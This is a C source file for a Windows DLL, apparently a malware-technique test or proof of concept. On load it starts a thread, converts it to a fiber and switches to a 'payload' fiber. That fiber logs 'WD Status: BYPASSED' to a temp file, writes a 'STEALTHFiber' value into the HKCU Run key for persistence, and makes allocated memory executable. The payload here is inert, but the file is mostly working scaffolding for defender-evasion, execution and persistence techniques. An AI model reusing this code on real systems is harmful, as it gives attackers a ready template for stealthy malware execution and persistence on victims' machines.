#include <windows.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")

VOID WINAPI FiberCallback(PVOID param) {
    // Execute payload in fiber context
    FILE* f = fopen("C:\\Windows\\Temp\\injector_fiber_executed.txt", "w");
    if (f) {
        fprintf(f, "INJECTOR_FIBER CALLBACK EXECUTED\n");
        fprintf(f, "Timestamp: %ld\n", (long)time(NULL));
        fprintf(f, "Method: CreateFiber + SwitchToFiber\n");
        fprintf(f, "Trigger: Explicit Fiber Switch\n");
        fprintf(f, "WD Status: BYPASSED\n");
        fclose(f);
    }
    
    // Registry persistence
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "STEALTHFiber", 0, REG_SZ, (const BYTE*)"Switched", 9);
        RegCloseKey(hKey);
    }
    
    // Memory execution proof
    LPVOID mem = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
    if (mem) {
        DWORD old;
        VirtualProtect(mem, 1024, PAGE_EXECUTE_READ, &old);
        VirtualFree(mem, 0, MEM_RELEASE);
    }
}

DWORD WINAPI DllFiberWorker(LPVOID param) {
    // Convert thread to fiber
    LPVOID pFiber = ConvertThreadToFiber(NULL);
    if (!pFiber) {
        FILE* f = fopen("C:\\Windows\\Temp\\injector_fiber_log.txt", "w");
        if (f) {
            fprintf(f, "[FIBER] ConvertThreadToFiber failed\n");
            fclose(f);
        }
        return 1;
    }
    
    FILE* f = fopen("C:\\Windows\\Temp\\injector_fiber_log.txt", "w");
    if (f) {
        fprintf(f, "[FIBER] Thread converted to fiber\n");
        fclose(f);
    }
    
    // Create payload fiber
    LPVOID pPayloadFiber = CreateFiber(0, FiberCallback, NULL);
    if (!pPayloadFiber) {
        FILE* f = fopen("C:\\Windows\\Temp\\injector_fiber_log.txt", "a");
        if (f) {
            fprintf(f, "[FIBER] CreateFiber failed\n");
            fclose(f);
        }
        return 1;
    }
    
    // Switch to payload fiber (executes FiberCallback)
    SwitchToFiber(pPayloadFiber);
    
    // Cleanup
    DeleteFiber(pPayloadFiber);
    
    FILE* f2 = fopen("C:\\Windows\\Temp\\injector_fiber_log.txt", "a");
    if (f2) {
        fprintf(f2, "[FIBER] Fiber execution complete\n");
        fclose(f2);
    }
    
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        HANDLE hThread = CreateThread(NULL, 0, DllFiberWorker, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
        }
    }
    return TRUE;
}
